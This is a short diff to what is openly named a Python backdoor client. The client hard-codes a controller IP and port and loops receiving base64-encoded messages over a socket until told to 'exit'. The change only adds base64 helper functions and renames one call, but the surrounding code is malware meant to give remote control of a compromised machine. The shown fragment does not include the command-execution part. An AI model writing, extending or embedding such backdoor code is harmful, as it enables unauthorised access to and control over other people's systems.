@@ -20,6 +20,13 @@ IP = '192.168.0.106'
 PORT = 33434
 CHUNKS = 2048
 
+def _base64_encode(message):
+    return base64.b64encode(message)
+
+
+def _base64_decode(message):
+    return base64.b64decode(message)
+
 
 def simple_python_backdoor_client_connect():
 
@@ -57,7 +64,7 @@ def main():
 
     # Infinite loop until socket can connect.
     while True:
-        data = base64_decode(_socket.recv(CHUNKS))
+        data = _base64_decode(_socket.recv(CHUNKS))
         str_data = data.decode()
 
         if 'exit' in str_data:
